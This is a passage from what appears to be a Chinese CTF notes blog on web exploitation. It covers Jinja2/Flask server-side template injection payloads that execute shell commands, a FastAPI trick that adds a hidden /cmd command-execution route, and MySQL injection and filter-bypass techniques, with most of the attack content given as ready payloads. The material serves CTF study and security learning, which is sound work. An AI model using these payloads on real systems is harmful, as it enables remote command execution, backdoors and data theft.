<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(lipsum[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>])[<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure>
<p>或者使用<code>attr</code>过滤器访问：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; lipsum|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;ls&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)() &#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="url-for、get-flashed-messages"><a href="#url-for、get-flashed-messages" class="headerlink" title="url_for、get_flashed_messages"></a>url_for、get_flashed_messages</h4><p>这是flask内置的两个全局函数，两个都用<code>__globals__</code>键</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flask</span></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="bytes"><a href="#bytes" class="headerlink" title="bytes"></a>bytes</h4><p>python3新增了bytes类，用于代表字符串，其fromhex()方法可以将十六进制转换为字符串</p>
<p><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &quot;&quot;[__class__]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;&quot;</span>.encode().fromhex(<span class="string">&quot;5f5f636c6173735f5f&quot;</span>).decode()]</span><br></pre></td></tr></table></figure>
<h4 id="add-api-route"><a href="#add-api-route" class="headerlink" title="add_api_route()"></a>add_api_route()</h4><p>在 FastAPI 中，<code>add_api_route</code> 是一个非常灵活且强大的方法，用于手动向应用程序中添加 API 路由。它提供了对路由行为的更精细控制</p>
<p><strong>方法签名</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_api_route</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    path: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    endpoint: <span class="type">Callable</span>[..., <span class="type">Any</span>],</span></span><br><span class="line"><span class="params">    *,</span></span><br><span class="line"><span class="params">    response_model: <span class="type">Any</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    status_code: <span class="type">Optional</span>[<span class="built_in">int</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    tags: <span class="type">Optional</span>[<span class="type">List</span>[<span class="built_in">str</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    dependencies: <span class="type">Optional</span>[<span class="type">Sequence</span>[Depends]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    summary: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    description: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_description: <span class="built_in">str</span> = <span class="string">&quot;Successful Response&quot;</span>,</span></span><br><span class="line"><span class="params">    responses: <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">str</span>], <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    deprecated: <span class="type">Optional</span>[<span class="built_in">bool</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    methods: <span class="type">Optional</span>[<span class="type">List</span>[<span class="built_in">str</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    operation_id: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_include: <span class="type">Optional</span>[<span class="type">Union</span>[SetIntStr, DictIntStrAny]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude: <span class="type">Optional</span>[<span class="type">Union</span>[SetIntStr, DictIntStrAny]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_by_alias: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_unset: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_defaults: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_none: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    include_in_schema: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    response_class: <span class="type">Type</span>[Response] = Default(<span class="params">JSONResponse</span>),</span></span><br><span class="line"><span class="params">    name: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    callbacks: <span class="type">Optional</span>[<span class="type">List</span>[BaseRoute]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    openapi_extra: <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    generate_unique_id_function: <span class="type">Callable</span>[[APIRoute], <span class="built_in">str</span>] = Default(<span class="params">generate_unique_id</span>)</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong></p>
<ul>
<li><strong>path</strong>：路由的路径，比如 <code>/items</code>。</li>
<li><strong>endpoint</strong>：处理该路由的函数，可以是同步或异步函数。</li>
<li><strong>response_model</strong>：定义返回的数据类型，通常是一个 Pydantic 模型，用于数据验证和文档生成功能。</li>
<li><strong>status_code</strong>：指定请求成功的 HTTP 状态码，默认值是 <code>200</code>。</li>
<li><strong>tags</strong>：为路由指定标签，便于在文档中对路由进行分组和组织。</li>
<li><strong>dependencies</strong>：定义路由的依赖项，比如身份验证或数据库连接等。</li>
<li><strong>summary</strong> 和 <strong>description</strong>：分别用于提供该路由的简要和详细描述，这些信息会显示在自动生成的文档中。</li>
<li><strong>response_description</strong>：描述成功的响应内容。</li>
<li><strong>responses</strong>：一个字典，可以用来定义更详细的响应信息，包括不同状态码的响应内容。</li>
<li><strong>deprecated</strong>：标记该路由是否已被废弃。</li>
<li><strong>methods</strong>：允许的 HTTP 请求方法列表，如 <code>[&quot;GET&quot;, &quot;POST&quot;]</code>。如果设置为 <code>None</code>，默认仅支持 <code>GET</code>。</li>
<li><strong>operation_id</strong>：唯一标识符，用于 OpenAPI 文档中标识该操作，通常自动生成。</li>
<li><strong>response_model_include</strong> 和 <strong>response_model_exclude</strong>：用于控制返回数据模型中包含或排除的字段。</li>
<li><strong>response_model_by_alias</strong>：是否按照模型字段的别名返回数据，默认为 <code>True</code>。</li>
<li><strong>response_model_exclude_unset</strong>、<strong>response_model_exclude_defaults</strong>、<strong>response_model_exclude_none</strong>：用于控制是否排除未设置的字段、默认值字段和值为 <code>None</code> 的字段。</li>
<li><strong>include_in_schema</strong>：是否将该路由包含在自动生成的文档中，默认为 <code>True</code>。</li>
<li><strong>response_class</strong>：指定返回的响应类，默认是 <code>JSONResponse</code>。</li>
<li><strong>name</strong>：路由的名称，用于在某些情况下如 OpenAPI 文档中标识该路由。</li>
<li><strong>callbacks</strong>：可以用来指定回调路由。</li>
<li><strong>openapi_extra</strong>：可以为 OpenAPI 文档提供额外的元数据。</li>
<li><strong>generate_unique_id_function</strong>：用于生成唯一的操作 ID 的函数。</li>
</ul>
<h4 id="奇妙的思路1"><a href="#奇妙的思路1" class="headerlink" title="奇妙的思路1"></a>奇妙的思路1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(self.__dict__._TemplateReference__context.keys())%&#125;</span><br></pre></td></tr></table></figure>
<p>语句获取已经载入内存中的Flask内置函数</p>
<p>然后可以利用 lipsum</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum.__global__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;more /f*&#x27;).read())%&#125;</span><br></pre></td></tr></table></figure>
<h4 id="奇妙的思路2"><a href="#奇妙的思路2" class="headerlink" title="奇妙的思路2"></a>奇妙的思路2</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18894779">第三届黄河流域公安院校网络安全技能挑战赛 web 全解 - LamentXU - 博客园</a></p>
<p>写static</p>
<p>创建static目录：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title</span>=<span class="number">1</span>&amp;author=&#123;&#123;g.pop.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;mkdir%20static&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>/details访问。触发。</p>
<p>mv同目录下文件到/static</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title</span>=<span class="number">1</span>&amp;author=&#123;&#123;g.pop.__globals__.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;mv%20*%20./static/LamentLament.txt&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>details查看触发SSTI。访问/static/LamentLament.txt获取flag</p>
<h3 id="一些不用动脑的（）"><a href="#一些不用动脑的（）" class="headerlink" title="一些不用动脑的（）"></a>一些不用动脑的（）</h3><p> <strong>Fenjing大法</strong></p>
<h3 id="基础例题"><a href="#基础例题" class="headerlink" title="基础例题"></a>基础例题</h3><h4 id="RUST下的SSTI"><a href="#RUST下的SSTI" class="headerlink" title="RUST下的SSTI"></a>RUST下的SSTI</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set my_var = <span class="title function_ invoke__">get_env</span>(name=<span class="string">&quot;FLAG&quot;</span>) %&#125;&#123;&#123;my_var&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="HNCTF-2022-WEEK2-ez-SSTI-NSSCTF"><a href="#HNCTF-2022-WEEK2-ez-SSTI-NSSCTF" class="headerlink" title="HNCTF 2022 WEEK2]ez_SSTI | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2953">HNCTF 2022 WEEK2]ez_SSTI | NSSCTF</a></h4><p>参数是name，测试得出模板是<code>jinja2</code>。</p>
<p><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()&#125;&#125;</code></p>
<p>用这个找到<code>os._wrap_close</code>类。定位到了<code>137</code></p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>查找用没有popen函数</p>
<p>发现有</p>
<p>则payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[137].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="BUUCTF在线评测-Flasklight"><a href="#BUUCTF在线评测-Flasklight" class="headerlink" title="BUUCTF在线评测 Flasklight"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CSCCTF 2019 Qual]FlaskLight">BUUCTF在线评测</a> Flasklight</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(%27os%27).popen(%27dir%27).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="综合绕过"><a href="#综合绕过" class="headerlink" title="综合绕过"></a>综合绕过</h3><h4 id="攻防世界-Web-python-template-injection"><a href="#攻防世界-Web-python-template-injection" class="headerlink" title="攻防世界 Web_python_template_injection"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> Web_python_template_injection</h4><p><code>&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code></p>
<p><code>&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('tac f14g').read()")&#125;&#125;</code></p>
<h4 id="LitCTF-2025-星愿信箱-NSSCTF"><a href="#LitCTF-2025-星愿信箱-NSSCTF" class="headerlink" title="LitCTF 2025]星愿信箱 | NSSCTF"></a><strong><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6776">LitCTF 2025]星愿信箱 | NSSCTF</a></strong></h4><p>发现成功回显49，证明存在SSTI</p>
<p>之后就正常SSTI：（过滤了cat）(nl也可以)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(g.pop.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).popen(<span class="string">&#x27;tac /*&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure>
<p><strong>另解：</strong></p>
<p><code>&#123;%print(self.__dict__._TemplateReference__context.keys())%&#125;</code></p>
<p>语句获取已经载入内存中的Flask内置函数</p>
<p>然后可以利用 <code>lipsum</code></p>
<p><code>&#123;%print(lipsum.__global__['os']['popen']('more /f*').read())%&#125;</code></p>
<h4 id="巅峰极客-2024-GoldenHornKing-NSSCTF"><a href="#巅峰极客-2024-GoldenHornKing-NSSCTF" class="headerlink" title="巅峰极客 2024]GoldenHornKing | NSSCTF"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5755">巅峰极客 2024]GoldenHornKing | NSSCTF</a></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add_api_route(path=<span class="string">&#x27;/cmd&#x27;</span>,endpoint=<span class="keyword">lambda</span> cmd :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(cmd).read())</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].app.add_api_route(path=<span class="string">&#x27;/cmd&#x27;</span>,endpoint=<span class="keyword">lambda</span> cmd :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(cmd).read())</span><br><span class="line"></span><br><span class="line">sleep.__init__.__globals__[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;eval&quot;</span>](<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].app.add_api_route(path=&#x27;/cmd&#x27;,endpoint=lambda cmd :__import__(&#x27;os&#x27;).popen(cmd).read())&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p><a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-tags/web/sql-injection/">SQL 注入 - Hello CTF</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0yst3r-2046/p/12469632.html">CTFHub题解-技能树-Web-SQL注入(整数型、字符型、报错注入、布尔盲注)【一】 - 0yst3r - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huanghelouzi/article/details/82999684">CTF中SQL注入常见题型整理_ctf sql-CSDN博客</a></p>
<ul>
<li><strong>数字型注入</strong>：将用户输入的数字直接用于 SQL 查询，且未进行适当验证或清理时，可构造恶意数字输入</li>
<li><strong>字符型注入</strong>：用户输入的字符型数据（如字符串）被直接拼接到 SQL 语句中，且未进行转义或参数化处理时，可插入特殊字符（如单引号、双引号等）和 SQL 语句片段，篡改原 SQL 语句</li>
<li><strong>盲注</strong>：无法直接从数据库报错信息或查询结果中获取数据，而是通过观察应用程序在执行注入 SQL 语句后的响应（如页面加载时间、页面内容变化等）来判断注入是否成功，并逐步推断出数据库中的数据</li>
<li><strong>宽字节注入</strong>：某些应用程序在处理字符编码时，会将宽字节字符（如 GBK 编码中的某些字符）转换为窄字节字符（如 UTF-8 编码中的字符）</li>
<li><strong>报错注入</strong>：攻击者通过构造特定的 SQL 注入语句，使数据库产生报错，并从报错信息中获取数据库的版本、表名、列名等信息</li>
<li><strong>二次注入</strong>：首先将恶意 SQL 代码存储在数据库中，然后通过其他功能（如数据展示、导出等）触发执行</li>
<li><strong>堆叠注入</strong>：通过分号（<code>;</code>）等分隔符，将多个 SQL 语句堆叠在一起执行</li>
<li><strong>约束攻击</strong>：利用 select 与 insert 对长度和空格处理方式不同造成的漏洞</li>
</ul>
<blockquote>
<p>[!CAUTION]</p>
<p>假设最大长度限制为 25 我们输入用户名为 admin[20 个空格 ]1, 密码随意。select 检查的时候实际用的是 admin1，这时数据库中是不存在 admin1 的，（假设数据库中已经存在 admin），所以会执行 insert 操作。但由于 select 与 insert 机制不同，insert 会直接截断，插入的是 admin[20 个空格]，由于 SQL 处理字符串的机制，实际插入的就变成了 admin，这样库中就插入了两条 admin</p>
</blockquote>
<ul>
<li><strong>文件操作</strong>：利用 SQL 注入进行文件读写操作。</li>
<li><strong>UDF 提权</strong>：UDF（用户自定义函数）是数据库中的一种扩展机制，允许用户创建自己的函数。通过 SQL 注入，创建恶意的 UDF，然后利用该 UDF 执行系统命令或进行其他提权操作。</li>
<li><strong>WAF Bypass</strong>：对常见的 SQL 注入关键字或者符号进行过滤，需要通过各类特性绕过限制从而实现注入。</li>
</ul>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>（本文只介绍联合查询、时间盲注、布尔盲注、报错注入，其余可能会另写）</p>
<p>现在的SQL在比赛中也比较少出现了，或者说2025年我参加的比赛中根本就没出现过，这边就只介绍MySQL</p>
<p>要判断是不是MySQL的数据库，只要看他的报错信息</p>
<p>如果报错信息是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; ... near &#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
<p>那么就是MySQL数据库</p>
<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>基于报错</strong>：在输入字段中输入特殊字符（例如，单引号 <code>&#39;</code>）可能会触发 SQL 报错</p>
<p>如果应用程序显示详细的报错消息，则可以指示潜在的 SQL 注入点</p>
<ul>
<li>简单字符：<code>&#39;</code>, <code>&quot;</code>, <code>;</code>, <code>)</code> 和 <code>*</code></li>
<li>编码后的简单字符：<code>%27</code>, <code>%22</code>, <code>%23</code>, <code>%3B</code>, <code>%29</code> 和 <code>%2A</code></li>
<li>多重编码：<code>%%2727</code>, <code>%25%27</code></li>
<li>Unicode 字符：<code>U+02BA</code>  <code>U+02B9</code><ul>
<li>MODIFIER LETTER DOUBLE PRIME (<code>U+02BA</code> 编码为 <code>%CA%BA</code>) 被转换为 <code>U+0022</code> QUOTATION MARK (`)</li>
<li>MODIFIER LETTER PRIME (<code>U+02B9</code> 编码为 <code>%CA%B9</code>) 被转换为 <code>U+0027</code> APOSTROPHE (`’)</li>
</ul>
</li>
</ul>
<p><strong>基于逻辑</strong>：通过输入永真条件（总是成立），可以测试漏洞。例如，将 <code>admin&#39; OR &#39;1&#39;=&#39;1</code> 输入到用户名字段中，如果系统有漏洞，则可能以管理员身份登录</p>
<ul>
<li><p>合并字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">`+HERP</span><br><span class="line">&#x27;||&#x27;DERP</span><br><span class="line">&#x27;+&#x27;herp</span><br><span class="line">&#x27; &#x27;DERP</span><br><span class="line">&#x27;%20&#x27;HERP</span><br><span class="line">&#x27;%2B&#x27;HERP</span><br></pre></td></tr></table></figure>
</li>
<li><p>逻辑测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1=1 -- true</span><br><span class="line">?id=1&#x27; or 1=1 -- true</span><br><span class="line">?id=1&quot; or 1=1 -- true</span><br><span class="line">?id=1 and 1=2 -- false</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>基于时间</strong>：输入引发故意延迟的 SQL 命令（例如，使用 MySQL 中的 <code>SLEEP</code> 或 <code>BENCHMARK</code> 函数）可以帮助识别潜在的注入点。如果应用程序在此类输入后响应时间异常长，则可能存在漏洞</p>
<ul>
<li>时间测试</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(1, sleep(5), 3) -- a	延时5秒响应</span><br><span class="line">?id=1&#x27; and if(0,sleep(5),3) -- a	正常响应</span><br></pre></td></tr></table></figure>
<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><ul>
<li><code>user()</code>：当前数据库用户</li>
<li><code>database()</code>：当前数据库名</li>
<li><code>version()</code>：当前使用的数据库版本</li>
<li><code>@@datadir</code>：数据库存储数据路径</li>
<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
<li><code>concat_ws()</code>：用法类似</li>
<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
<li><code>CHAR()</code>：把整数转换为对应的字符</li>
<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
</ul>
<p><strong>判断字段数：</strong></p>
<ul>
<li>order by 1 #</li>
</ul>
<p><strong>information_schema数据库</strong></p>
<ul>
<li><strong>schemata</strong>: 保存当前整个服务器所有的数据库信息 库名</li>
<li><strong>tables</strong>: 保存当前整个服务器所有的数据表的信息 表名 table_name</li>
<li><strong>columns</strong>: 保存当前整个服务器所有的字段信息 字段名</li>
<li><strong>group_concat</strong>: 去重</li>
<li><strong>concat</strong>: 将两个字段拼接起来(concat(database(),1)，会回显数据名+1)</li>
</ul>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p>获取库名。修改参数为<code>?id=-1&#39; union select 1,2,database()--+</code></p>
<p>获取表名。修改参数为?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()—+</p>
<p>爆数据库:<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23</code> (这只是一个例子)</p>
<p>爆数据库：<code>1&#39;;show databases;#</code></p>
<p>爆表：<code>1&#39;;show tables;#</code></p>
<p>爆字段：<code>1&#39;;show columns from (自己填);#</code></p>
<p>测试字段数：<code>1&#39; order by 1 #</code> </p>
<h3 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h3><h4 id="空格绕过-1"><a href="#空格绕过-1" class="headerlink" title="空格绕过"></a>空格绕过</h4><p><strong>URL 编码：</strong></p>
<ul>
<li><code>%09</code> .Eg：<code>?id=1%09and%091=1%09--</code></li>
<li><code>%0A</code> .Eg：<code>?id=1%0Aand%0A1=1%0A--</code></li>
<li><code>%0B</code> .Eg：<code>?id=1%0Band%0B1=1%0B--</code></li>
<li><code>%0C</code> .Eg：<code>?id=1%0Cand%0C1=1%0C--</code></li>
<li><code>%0D</code> .Eg：<code>?id=1%0Dand%0D1=1%0D--</code></li>
<li><code>%A0</code> .Eg：<code>?id=1%A0and%A01=1%A0--</code></li>
<li><code>%A0</code> .Eg：<code>?id=1%A0and%A01=1%A0--</code></li>
</ul>
<p><strong>IFS：</strong></p>
<p><code>$&#123;IFS&#125;</code></p>
<p><code>$9IFS</code></p>
<p><strong>注释&amp;括号：</strong></p>
<p><strong>注释 -1</strong>：<code>?id=1/*comment*/AND/**/1=1/**/--</code></p>
<p><strong>注释 -2</strong>：<code>?id=1/*!12345UNION*//*!12345SELECT*/1--</code></p>
<p><strong>括号 -1</strong>：<code>?id=(1)and(1)=(1)--</code></p>
<h4 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h4><p>使用 <code>OFFSET</code>、<code>FROM</code> 和 <code>JOIN</code> 进行绕过。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">BAN</th>
<th style="text-align:left">绕过</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>LIMIT 0,1</code></td>
<td style="text-align:left"><code>LIMIT 1 OFFSET 0</code></td>
</tr>
<tr>
<td style="text-align:left"><code>SUBSTR(&#39;SQL&#39;,1,1)</code></td>
<td style="text-align:left"><code>SUBSTR(&#39;SQL&#39; FROM 1 FOR 1)</code></td>
</tr>
<tr>
<td style="text-align:left"><code>SELECT 1,2,3,4</code></td>
<td style="text-align:left"><code>UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="等号绕过-1"><a href="#等号绕过-1" class="headerlink" title="等号绕过"></a>等号绕过</h4><p>使用 <code>LIKE</code>、<code>NOT IN</code>、<code>IN</code>、<code>BETWEEN</code> 进行绕过</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">绕过</th>
<th style="text-align:left">SQL 示例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>LIKE</code></td>
<td style="text-align:left"><code>SUBSTRING(VERSION(),1,1)LIKE(5)</code></td>
</tr>
<tr>
<td style="text-align:left"><code>NOT IN</code></td>
<td style="text-align:left"><code>SUBSTRING(VERSION(),1,1)NOT IN(4,3)</code></td>
</tr>
<tr>
<td style="text-align:left"><code>IN</code></td>
<td style="text-align:left"><code>SUBSTRING(VERSION(),1,1)IN(4,3)</code></td>
</tr>
<tr>
<td style="text-align:left"><code>BETWEEN</code></td>
<td style="text-align:left"><code>SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>使用大写 / 小写进行绕过。</p>
<p>大写：<code>AND</code> 小写：<code>and</code> 混合：<code>aNd</code></p>
<h4 id="符号和字母相互代替"><a href="#符号和字母相互代替" class="headerlink" title="符号和字母相互代替"></a>符号和字母相互代替</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">BAN</th>
<th style="text-align:left">绕过方法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>AND</code></td>
